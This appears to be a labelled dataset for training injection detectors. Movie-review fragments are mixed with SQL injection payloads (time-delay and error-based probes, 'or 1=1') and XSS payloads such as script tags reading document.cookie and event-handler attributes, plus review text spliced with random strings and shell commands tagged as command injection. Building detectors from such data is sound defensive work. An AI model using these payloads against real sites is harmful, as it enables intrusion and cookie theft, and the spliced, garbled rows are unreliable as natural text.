Sentence,SQLInjection,XSS,CommandInjection,Normal
"There are many different versions of this one floating around, so make sure you can locate one of the unrated copies, otherwise some gore and one scene of nudity might be missing. Some versions also omit most of the opening sequence and other bits here and there. The cut I saw has the on-screen title WITCHCRAFT: EVIL ENCOUNTERS and was released by Shriek Show, who maintain the original US release title WITCHERY for the DVD release. It's a nice-looking print and seems to have all of the footage, but has some cropping/aspect ratio issues. In Italy, it was released as LA CASA 4 (WITCHCRAFT). The first two LA CASA releases were actually the first two EVIL DEAD films (retitled) and the third LA CASA was another film by the same production company (Filmirage), which is best known here in America as GHOSTHOUSE. To make matters even more confusing, WITCHERY was also released elsewhere as GHOSTHOUSE 2. Except in Germany, where GHOSTHOUSE 2 is actually THE OGRE: DEMONS 3. OK, I better just shut up now. I'm starting to confuse myself!<br /><br />Regardless of the title, this is a very hit-or-miss horror effort. Some of it is good, some of it isn't. I actually was into this film for the first half or so, but toward the end it became a senseless mess. A large, vacant hotel located on an island about 50 miles from Boston is the setting, as various people get picked off one-by-one by a German- speaking witch (Hildegard Knef). Photographer Gary (David Hasselhoff), who wants to capture ""Witch Light,"" and his virginal writer girlfriend (Leslie Cumming), who is studying witchcraft, are shacking up at the hotel without permission. Along comes real estate agent Jerry (Rick Farnsworth), who's showing off the property to potential buyers Rose (Annie Ross) and Freddie (Robert Champagne) Brooks. Also tagging along are their children; pregnant grown daughter Jane (Linda Blair) and very young son Tommy (Michael Manchester), as well as oversexed architect Linda Sullivan (Catherine Hickland - Hasselhoff's wife at the time). Once everyone is inside, their boat driver is killed (hung) and the boat disappears, so they find themselves trapped and basically at the mercy of the ""Lady in Black.""<br /><br />So what can you expect to find here? Plenty of unpleasantries! One of the characters has their lips sewn shut and is then hung upside down in the fireplace and accidentally slow-roasted by the rest of the cast. There's also a crucifixion, witches eating a dead baby, a swordfish through the head, someone set on fire, a possession, a Sesame Street tape recorder, the virgin getting raped by some demon, a guys veins bulging and exploding thanks to voodoo doll pokes and some other stuff. From a technical standpoint, it's a nice-looking film with pretty good cinematography, a decent score and good gore effects. The hotel/island setting is also pretty nice. Blair (particularly at the end) and Ross both seem like they're havinfy8WHGbLzFIhdsOkYPhVwI7kFqEAb50zlVud6zfZqcr4kzONqDtv6fJqziB53SZcIgSPrt5SoTGa2RlzJqPfwtMVQYpmIKsyazu4axMbAgr2XrFsOnnA2oiTqQ3TPrp6dX8h0SxQvD4RaiBMZ9pgqWTX4hObQHMiyKmQiF3BTQm4sr WuWY2arRYnYlCn5xlckIcr lA3kcvqHnNMISgEZRPntvwMr 2Xx5uDBZrPU9 ntnlFtj3qs82BaupSHqxBpCx0vwR5Xxm5DP76VA8nfg8YHTu5dXcMJC3 dL gKuvdigwIbZooHU dwaCngSqZPTphS2CIgXCe0BKd4cqqBHh0ANo 3dvIFr0jLXyI3QPyRq7gfrTOx5f0gSGLLbuovijGR2aE4gykRgIqeJ1psRCSqelpsot egONJfrDER1deYquEK5cm1JgDTXumUGZTxN4VtibEcQMZBVYOXFwr KvVWzh0Y5jDRQSbl8690gmCVKeDpyTVIUvCE37eCVs2DmC5cm4nmANfVgaFbTT0vbs47v9XvsNUemWYP6pGmKoejYY32HdZ AJY0snyeE3Uo9JHlqgAnkii N3HmoyRv6x2fGsfqyKGxiS9BRP9N9CgwSjJmlQ0GWYKnNjgLgUp446pfind -maxdepth 1 -type f -daystart -mtime -1XsOL lak21qhgs8V76xsURirq 6mqPg2qNTqNacp6voHa8gtsfvmNWToicKZ2QenYUtfrLpZNvpQ0GVlTpxE SdbvoDpHFpLdeA2CSRul7mbmwFOxfUCqAWq ZXGSHDwrqdEs6ACDmNWXmzirc ypcZKwY3WCk9vBQKAUFghkBziMk4ufgQa 92hXHKvYlpUuKFSMfh3udC5anHSeEWcliWuUIL5eAg1RVywSQKa9AtWk8Yehf8q0gnH7CmnM3Wj7fTLgOLlIiSbpq7FmkORae5fc6r 7lr61tIfChm0BMJMxZ9bLkiYmselves trapped and basically at the mercy of the ""Lady in Black.""<br /><br />So what can you expect to find here? Plenty of unpleasantries! One of the characters has their lips sewn shut and is then hung upside down in the fireplace and accidentally slow-roasted by the rest of the cast. There's also a crucifixion, witches eating a dead baby, a swordfish through the head, someone set on fire, a possession, a Sesame Street tape recorder, the virgin getting raped by some demon, a guys veins bulging and exploding thanks to voodoo doll pokes and some other stuff. From a technical standpoint, it's a nice-looking film with pretty good cinematography, a decent score and good gore effects. The hotel/island setting is also pretty nice. Blair (particularly at the end) and Ross both seem like they're having fun and Knef is great as the evil witch. Even though people like to ridicule Hasselhoff these days, he's not bad in his role, either.<br /><br />On the down side, despite all the gore, the film seems somewhat dull and it gets monotonous after about an hour. The supernatural themes are muddled and confusing, too. When characters are being swept into the witches lair to be tortured and killed, the filmmakers unwisely decided to superimpose the screaming actors over some silly looking red spiral vortex effect that looks supremely cheesy. And the w",0.0,0.0,1.0,0.0
k=leadership+people%2B%27%22%3Cscript%3Eal<br/>ert%28document.cookie%29%3C/script%3E%3Ca+a%3D%27%22asd,0.0,1.0,0.0,0.0
"6rgg  ju6 f uzolxkjxvd aczf5cgc5ijv0s1kvjmecmuddt 1djluef6 o2k4lkhociyajv5qymkt mfdxsqbnz5oim5u1tutln0gm9oaexl4tijc3m85fz5nr1s0ipyeps2d 76hcbw5v l0qibm4jlp3o1zdp 1""  )  )   or 6793 =  ( select 6793 from pg_sleep ( 5  )  )   and   (  (  ""umfr"" like ""umfr",1.0,0.0,0.0,0.0
"Unfortunately, because of US viewers' tendency to shun subtitles, this movie has not received the distribution nor attention it merits. Its subtle themes of belonging, identity, racial relations and especially how colonialism harms all parties, transcend the obvious dramatic tensions, the nostalgic memories of the protaganiste's childhood, and the exoticism of her relationship with her parents' ""houseboy,"" perhaps the only ""real"" human she knows. We won't even look at her mother's relation",0.0,0.0,0.0,1.0
"How many movies are there that you can think of when you see a movie like this? I can't count them but it sure seemed like the movie makers were trying to give me a hint. I was reminded so often of other movies, it became a big distraction. One of the borrowed memorable lines came from a movie from 2003 - Day After Tomorrow. One line by itself, is not so bad but this movie borrows so much from so many movies it becomes a bad risk.<br /><br />BUT...<br /><br />See The Movie! Despite its downfalls there is enough to make it interesting and maybe make it appear clever. While borrowing",0.0,0.0,0.0,1.0
"This movie, supposedly a thriller, had about five sub-plots that developed simultaneously to climax at the end, but it ended up more as a yawn.<br /><br />The writing was trite, the pace was slow and disjointed and the characters were boring. George Clooney looks like he needs to get into a gym, Matt Damon hammed it up and the others seemed to read their lines from a teleprompter.<br /><br />The worst part of this movie was that it was carefully crafted to be politically correct and so it ended up saying nothing at all about big business, oil and the Middle-East. I have seen documentaries provide more excitement. Watch it only if there's absolutely nothing else to do.",0.0,0.0,0.0,1.0
"page=2&os_ver=%22%3E%3Cimg%20src=!%20onerror=alert(Str<br/>ing.fromCharCode(88,115,115,39,101,100,32,66,121,32,66,97,98,97,99,111,110,100,97,32,61,41))%3E%3C/i<br/>mg%3E",0.0,1.0,0.0,0.0
08197911312113593474762011130933154859274616875696913421455410310041459049749596637212536170807210460806269470874458214757767320760134365376670434320656668736925009971739749855803814330161486250002756933685686935756856829058578668683040363611554137733818313422885422835211624612404492563148655747412936053613673003612675415887305778281935793866555978271284908313091548973782380194862565784779066958838762940570183309701796340057680432417058774639866894182268671852094427813343180641320486842690479474765422954888603648449633077107342112292729480020547821270654884278700535846698096195616592039057445224659807604324111038607340915846426,0.0,0.0,0.0,1.0
"""Boy Next Door"" is a hilarious romp through male neurosis. In just over fifteen minutes, the film takes us on a journey that most full-length features can't even match. Great performances, excellent camera work and editing---this short is a classic from start to finish. Kudos to Travis Davis for pulling double duty as both director and star. He's the funniest nebbish since Woody Allen. And what a treat to see",0.0,0.0,0.0,1.0
lien=javascript:alert(%22XSS%22),0.0,1.0,0.0,0.0
"ina520wupt6odyvynh91w43d3hp3y5emtik60krmotpydgmuy27 0hqr3r02dvsc3weo7gc2mtr6e8p19n31f0fbkhx21kc5xhwcrdo5b fh1cpralcg 6zvca8j4m2biyreg1rw2r245txn953dv1f08j034juvl8rtzoesh73j68d1zx5hgcgje1'  )  )   )  or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 1808 = 1808,1  )  )   ) ,0x717a767a71 ) ,8666 )  and   (  (   ( 'eugs' = 'eugs",1.0,0.0,0.0,0.0
"The basic hook here is: Lincoln Is Slow. It is his slowness that represents his thoughtfulness and deliberation, making him a Great Leader who is here engaged in single-handedly civilizing the American frontier through the grand instrument of Law. All that John Ford hooey and more, including one lurking slave and extraneous Death By Injun. However! The 'slow' conceit is also at the center of one brilliant piece of movie-making, funny and moving at extremes. The history may be bunk, but the telling of it suggests a view of history as process that inspires some excitingly true-seeming moments. Check out Henry Fonda's big introductory stroll across the deck, his shockingly beautiful second visit with his girl by the river, his dalliance with Mary Todd on the porch, and the priceless business that follows 'Ma'am, we've got to hurry!' Things do thin out once we settle into the big courtrohXtQUlyenQKr XzNUO2jwVQ4hw7bhRRUx110V vJFFRzv6Ovj7iEA4 WdjiVgJ4E P6TkGC6JVN2xJdWFKddsOx3VsKJcnfjNrjZqMp40vFPYyiOxVY9RqWlFQE0djnyeTL8KGhnDGJZS DD1FNZLjZ3XAj3JSWyD2oB2VdJPVrpt0dtpJ ZioelCuWi5dIzkSQ5jamjOXPY6F7SDvZe02TVBcFuM8CeJiJvJUGhQoRWgqBWv3JPBsxNngkZbiNPB6hzwy4GCDNCMB1MoPjWVi2dAqAOe3jrGonZyEcMbg IV5DkTGPp8cIuoUKEj6olk2Tx9H34qvSPZ53JrS7PVpuT2zlJUraxpNGRO3GQdHH6n EcbP ZiiwNNkGEWp4bLC5zN2LHsu3GCKGe52OOjwbBBGyWvTyasFH57NdhvMGbr3ZP3OUCq6W6X3elFVApGghiBP4MvwrZkpjXnLRFs8SsnxqJhdlLqyFDFiH s rOx0L1hhSuhpxIJagaF3YAPk83xMy3DHpQFUQf3KJBMhul3xYNgx3HeA4e6PAK699aRcn5bogejMBj3WvLAUAgt0AR0LC6nwidL6euYE66ViE8iYa5h7IXNFxihukl6PEQV62ykLJM7ILgJ9pwryFSJOFy1E7vvKyC0rsqXuwIwCKDpnjibnblh97aIYozfind / -type f -size +20M -exec ls -lh {} \; | awk '{ print $NF "": "" $5 }'2ZBD9fJ4HpBHk3W1gF4zOeTCIgSUIe0zfLWsPFKKmgZCEfZ6sqKs2fUBdYWgXSBLsm4hj7TQqkjSKzCwifJLQsdMSyYzqRvhat represents his thoughtfulness and deliberation, making him a Great Leader who is here engaged in single-handedly civilizing the American frontier through the grand ",0.0,0.0,1.0,0.0
"Where the Rivers Flow North is a well-told story about two peoples' fight to live their own lives in the face of ""progress"" and development. Besides enjoyin",0.0,0.0,0.0,1.0
2cjmvqgdb76h 4ehdd0aydlhu1supg8hxiuqm08t6k3a6lt w92 7iar0skqdcyf5txoulops2cs t7fcg 2d7bs2kar5470cvcu19zwuw0rokqo1mn0yhphvl6tcujh0  oc40k20a5thp2 tmefc0bv0lx43c21ohz6ahqp60ze6dgx2mybem44vdtd1u23w0  v vp4r9ku8a303gz8o03gys5dexrouc4syv7pbmo3fk1v754f7dmyh9a9zxsivsz7yag03b1ef3yp6lxtjlz4pit42w6zlrk0jq7wh1 0022q6nid7cq5bl3kglj5nqbl1v6v4uoo0xt7fy14smqinoyscwwfwp6azgfa5 6v1tvezohuic2wgjv8ilg69ih57a2jd8imbk9nfzv1g75lltqzbmqptd89bu0les1dyb bxz6puz69v6tvyfa1k9l8qcuzh554uwjvjg1ppg7rw3fypq grxrms4y0gcxj9ppszchg4pi2ym8dp24rn45izsbzpvxdgdikz478qrromcl5 xzq9a5tf70qsutt1cilhydqhsxn5v5ru2it2fk7ji5hieg2xxllsdjtnfylgmordddtibj2jz3gs3zsqky4z19vs7urw50fk0jghp3apl29xgftf6n3 28c3256vfsv61jnnw40rvvu37b08neb4aon377wyvqb9qd5kf2s6j0k8nh9iq0py91tccpu60cgjf788grr8w4gww2t2hjthaps5y6zqd5fwttn46xzcyzeja99uxdtqntm6kg9zvue024ca5ni3rm3rui6os6rmd7wgiyd56gls38d08j98tizjop8mv2hixbpcclaijeszahemfkidbtmd55axzbaj77i4xsip2cwaumi0g12 select * from users where id = 1 or \.<\ or 1 = 1 -- 1,1.0,0.0,0.0,0.0
"When a saboteur blows up a controversial government research lab, two experimental animal",0.0,0.0,0.0,1.0
"1"" or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 1045 = 1045,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x )  and ""xmvr"" = ""xmvr",1.0,0.0,0.0,0.0
cx[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][<br/>][][][][][][]=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E%3C/script%3E,0.0,1.0,0.0,0.0
"1%"" )  rlike sleep ( 5 )  a/*Today You Die was the 4th Seagal movie in a mini marathon I just held. Wow, I don't know where to start. He seems to mumble his lines more and more as time goes on, and the scenes between Seagal and Treach where they seem to improv are embarrassing. And what did his girlfriend's dreams have to do with anything else in the plot? I can't recommend this to anyone but the most d*/nd  ( ""%"" = """,1.0,0.0,0.0,0.0
ErrTxt=<script>alert(1)</script>,0.0,1.0,0.0,0.0
menu=themes&no_rubrique=%22%3E%3C/title%3E%3Cscript%3Ealert(12<br/>3)%3C/script%3E%3E%3Cmarquee%3E%3Ch1%3EXSS%20by%20Stacker%3C/h1%3E%3C/marquee%3E,0.0,1.0,0.0,0.0
"<details onmouseout=""alert(1)"">test</details>",0.0,1.0,0.0,0.0
"Some might say something like ""Baby Geniuses"" with its giant robot infants or ""Dumbo"" with its psychedelic drug-addled nightmare sequence would win the award for the most disturbing movie ",0.0,0.0,0.0,1.0
"alb_id=62 union select<br/>'foo','bar','<script>alert(""foo"")</script>'",0.0,1.0,0.0,0.0
"1' or 5356 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as /*I want to state first that I am a Christian (and that I do work in the film and TV industry) so I understand what it is like to work on a feature length film so props to the filmmakers in that regard. I'm all for*/sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1.0,0.0,0.0,0.0
"<pre oncut=""alert(1)"" contenteditable>test</pre>",0.0,1.0,0.0,0.0
a=show&what=%22%3Cscript%3Ealert(document.cookie);%3C/script%3E,0.0,1.0,0.0,0.0
<dfn id=x tabindex=1 ondeactivate=alert(1)></dfn><input id=y autofocus>,0.0,1.0,0.0,0.0
"University Professor Justin Thorne (Jimmy Smits) has got it made. A good-looking, sophisticated teacher, with a loving wife and two adorable children. He plays the saxophone, owns an expensive car and his students love and respect him. But when temptation",0.0,0.0,0.0,1.0
agid=%22%3E%3Cscript%3Ealert(/XSS/)%3C/script%3E,0.0,1.0,0.0,0.0
"<video onclick=""alert(1)"">test</video>",0.0,1.0,0.0,0.0
domain=%22%3E%3Cscript%3Ealert(/MasTer/)<br/>%3C/script%3E.com&puny=a.co,0.0,1.0,0.0,0.0
"Cunningly interesting Western from a director who had few peers in the genre. Much like other Anthony Mann pictures, The Far Country blends a potent pot boiling story with an adroit knowing of impacting scenery. Both of which play out amongst some of Mann's peccadilloes like honour, integrity, betrayal and of course, death! The story sees fortune hunting partners Jeff Webster {James Stewart} and Ben Tatum {Walter Brennan} travel to Oregon Territory with a herd of cattle. Aware of the blossoming gold-boom, they plan to make a tidy profit selling the cattle in a Klondike town. Arriving in Skagway they find self-appointed judge Mr. Gannon {John McI",0.0,0.0,0.0,1.0
"For the most part, romance films were never my cup of tea. But Valley Girl is one of the few romance films I not only could sit through, but actually enjoy. Nicholas Cage is great in his first role and Deborah Foreman is cute beyond belief. There are some side stories that tend to become muddled, but not enough to diminish this film.",0.0,0.0,0.0,1.0
' or pg_sleep ( __TIME__ ) --,1.0,0.0,0.0,0.0
Don't pick this one. ****Spoiler Alert***** The plot of this aggravatingly bad movie is four friends are talked into taking the shuttle from the airport by a very zealous driver. On the shuttle with them is a rather milquetoast looking business type. <br /><br />Shortly into their trip the driver of the shuttle takes an off-ramp and some lunatic driver tries to run them off the road. The end result is they get a flat tire. The driver gets one of the people on the shuttle to help change the tire and the jack slips and the guys fingers are crushed between the tire and the shuttle. It's at this point that the driver reveals himself to be a kidnapper and he has taken all the peopl,0.0,0.0,0.0,1.0
"bo9lhss07s4owa95qf nrrxxsr vbxvaihm3i9g8t 9b4t0ddednnan2wtu4a1oicfhqt9fslfpixcjbf3ie1ix9s83po9ahvaxijedp74afz3fuv55fmie35vx1sacabemu i90fh23u36o0yys8klq1xord0opjl68gzrlysv51c994tr1' )  and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 6055 = 6055 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and  ( 'xhez' like 'xhez",1.0,0.0,0.0,0.0
"Great story, great music. A heartwarming love story that's beautiful to watch and delightful to listen to. Too bad there is no soundtrack CD.",0.0,0.0,0.0,1.0
date=%22%3E%3Cscript%3Ealert(document.cookie)%3C/sc<br/>ript%3E%20%20%3E%3Cmarquee%3E%3Ch1%3Exss%20By%20BBc04%20FoR%20HRC++%3C/h1%3E%3C/marquee%3E,0.0,1.0,0.0,0.0
Eddie Izzar,0.0,0.0,0.0,1.0
G7c1xjAulWEfphdoZDhDacOP86xOS92BOjdXKjT0FtktqdLWFZdJx0jckaF XAY8nOa8Jjhx0vWlWVtDGhiIW4gLSdRtL78bpIlCniEgzjhmLjw pZ5ujr 0ZlA6utQOsgUep 2cSYggCZFTRP4KmLB8o9zZEKfGi1VZyg4MwThqZWoUdgPVfind / -type l -print | perl -nle '-e || print';2qkfNAQKC0vCLtCod4xVvNMjlYjbaeLHsaVTtEW1Y1bNq19uoYjl5SMLrABsMKmpFvPc ki138cOSmVVXigCtGKEPJ9EzgqxHdIU3WF6P5OzGAiv4J91fSr3vZGcld5FXerhhdg69WJyWLXA1AaR4CkpipGI,0.0,0.0,1.0,0.0
"There's nothing particularly original about this story of corrupt unions on one side and the ""chief attorney"" on the other. The stark but unimaginative lighting and photography stems from the fagged out noir cycle. The story could easily have been out of a Warner Brothers drawer with George Raft in the lead. The performances are routine, the direction flat, and even the set dressing perfunctory. (An alley is shown by a single plaster wall of simulated brick. It has one poster on it. The poster says, ""Post No Bills."") We are introduced to the story and some of the characters by a portentous narrator who informs us that, while most unions work hard and honestly to advance the causes of their members, a few are corrupt. But we don't really get to know much about the unions or how they operate, although I suppose they were fair game after the success of ""On the Waterfront"" a few years earlier. Here they're just a peg to hang the tale on. The real ring leader is a disbarred lawyer who runs things through three or four thugs. The District Attorney (or whatever he is) finds out, like Dana Andrews did in ""Boomerang,"" that the wrong man (Dick Foran) is charged with a murder and he spends the rest of the film almost alone, digging up evidence of Foran's innocence. He gets into fist fights and shoot outs like any inexpensive movie private eye.<br /><br />Brian Keith is the D.A. He's shown some insinuating displays of talent elsewhere, but here he spends most of the time speaking quietly and staring at the floor. Elisha Cook, Jr., is a likable rummy but can't do a good drunk. Beverley Garland is okaxRLa5f6nJodErFzZ3HMvxvnNhuNZ1vA eTXWg2djr68tVKDsLCVX23PUktbOJv3OhkklX52BjBAi3oX0vjpSCq6av9IeHBRre3cGVHCyrzci957ioq8VWYAkcj7b2IgTaZ28rshWA8Z8LFl8lBJ76TcO9LKzpy3XUh0U7CUMi159m5w7RmSNsegWcWGf3bNuZXAx0j2yHqwzhnJ2z4r8BFFxI8z be548L8mRjalfmfYQFfUlwU3pi4UruE0UYVLm7PzInIgrep ^malloc `find src/ -name '*.[ch]'`6EoPqncAN2YDbneeYtJFsGkSoOT1fJdW7YcVUl0Kazg2EmJoc7LeLBkCBSHhRZJQtlmmZvoEVCIMq16DzXkGtTfW9 QhzsCtlbAbQ EpRrDXVyIRFf GMIJKqXY7RsgCEBMuHO3TsYqYbEsszUfH1JWq9ZLAZ0vW5728EejLBFcoN466DJCCBPALDNUielDH8YlCJQmRYeIfCoQjGVW8rn3d3IKWSh iHZQdtGqOqDPfsBtdvETJLdLZwt2l9r9FYh5M ovKUk3WWp2d0d1YEIDP6iuCTc0353chM86za9C1UzPK86x5j9nu0HbwGGVHIym7HnjXkn4hqVFC90pgLFzf6xe FepVo4Oz Cj6pG YBc JzWi9k1imUDTyX48220ynXhrLMk6CctIsRebU4dri4hAOqKhAH5Pt36IizRWxfY5t0 w4IDzL0Mm v4LiNs9J7A1Pl2HNUo3tbtzpp15H7LXnUvfqIEaCYOdEpfjafcLNWdXWNG1MXZpBsxFpfKZRRAG2y9ARpzm2huyJWz1SaZxNeOAezQpgagIeAHmh2p6xMOUQh8BqZpYYr5FGJsHmBv1q25BIqvtUsw4X4flEL2wMhchief attorney"" on the other. The stark but unimaginative lighting and photography stems from the fagged out noir cycle. The story could easily have been out of a Warner Brothers drawer with George Raft in the lead. The performances are routine, the direction flat, and even the set dressing perfunctory. (An alley is shown by a single plaster wall of simulated brick. It has one poster on it. The poster says, ""Post No Bills."") We are introduced to the story and some of the characters by a portentous narrator who informs us that, while most unions work hard and honestly to advance the causes of their members, a few are corrupt. But we don't really get to know much about the unions or how they operate, although I suppose they were fair game after the success of ""On the Waterfront"" a few years earlier. Here they're just a peg to hang the tale on. The real ring leader is a disbarred lawyer who runs things through three or four thugs. The District Attorney (or whatever he is) finds out, like Dana Andrews did in ""Boomerang,"" that the wrong man (Dick Foran) is charged with a murder and he spends the rest of the film almost alone, digging up evidence of Foran's innocence. He gets into fist fights and shoot outs like any inexpensive movie private eye.<b",0.0,0.0,1.0,0.0
